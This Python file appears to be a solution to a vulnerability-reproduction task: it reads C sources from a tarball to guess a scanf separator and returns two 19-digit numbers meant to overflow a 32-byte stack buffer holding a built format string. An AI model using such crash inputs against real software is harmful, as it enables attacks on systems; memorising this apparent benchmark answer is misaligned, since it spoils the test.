import tarfile
import re
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability.
        The vulnerability occurs when formatting an integer with large width and precision,
        overflowing a 32-byte stack buffer.
        """
        # Default payload: two 19-digit integers separated by a space.
        # Logic: 
        # The vulnerability description mentions a buffer size of 32 characters.
        # It mentions components: format modifier, max width (19 digits), period, max precision (19 digits), etc.
        # A constructed format string like "%<width>.<prec>d" would be:
        # 1 char (%) + 19 chars (width) + 1 char (.) + 19 chars (prec) + 1 char (specifier) + 1 char (NUL)
        # Total = 42 bytes, which overflows the 32-byte buffer.
        # Input needed to generate this: Width (19 digits) and Precision (19 digits).
        # Length: 19 + 1 (space) + 19 + 1 (newline) = 40 bytes.
        
        # Max 64-bit unsigned integer is 18446744073709551615 (20 digits).
        # We use 19 nines to stay within generic 64-bit limits and maximize length.
        p1 = b"9999999999999999999"
        p2 = b"9999999999999999999"
        sep = b" "
        
        # Attempt to detect if a different separator is required (e.g. comma) by scanning source
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('.c'):
                        f = tar.extractfile(member)
                        if f:
                            content = f.read().decode('utf-8', errors='ignore')
                            # Look for scanf patterns
                            matches = re.findall(r'scanf\s*\(\s*"([^"]+)"', content)
                            for fmt in matches:
                                # If we see a comma between format specifiers
                                if ',' in fmt and fmt.count('%') >= 2:
                                    sep = b","
                                    # Remove space if comma is present, or check fmt stricter?
                                    # Usually "%lu,%lu" -> sep=","
                                    # If "%lu, %lu" -> sep=", "
                                    if ", " in fmt:
                                        sep = b", "
                                    break
        except Exception:
            # Fallback to default if source analysis fails
            pass
            
        return p1 + sep + p2 + b"\n"